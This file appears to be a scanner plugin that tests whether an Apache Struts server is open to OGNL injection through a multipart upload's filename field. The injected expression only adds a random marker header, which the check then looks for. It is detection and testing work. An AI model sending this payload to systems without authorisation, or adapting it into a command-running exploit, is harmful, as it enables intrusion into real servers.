#!/usr/bin/evn python
# -*-:coding:utf-8 -*-
import urlparse
import random


def assign(service, arg):
    if service == fingerprint.struts:
        return True, arg


def audit(arg):
    uri = urlparse.urlparse(arg).path
    randint1 = random.randint(1000, 10000)
    raw = """POST {uri} HTTP/1.1
Accept-Encoding: identity
Content-Length: 171
Content-Type: multipart/form-data; boundary=1c88e9afa73c438d93b5043a7096b207
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36

--1c88e9afa73c438d93b5043a7096b207
Content-Disposition: form-data; name="image1"; filename="%{{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test-{randint1}','Kaboom')}}'\x00b"
Content-Type: text/plain


--1c88e9afa73c438d93b5043a7096b207--
""".format(uri=uri, randint1=str(randint1))

    code, head, html, redir, log = hackhttp.http(arg, raw=raw)
    if "X-Test-%s" % str(randint1) in head:
        security_hole("%s" % arg, log=log)

if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.struts, "http://127.0.0.1:8080/")[1])
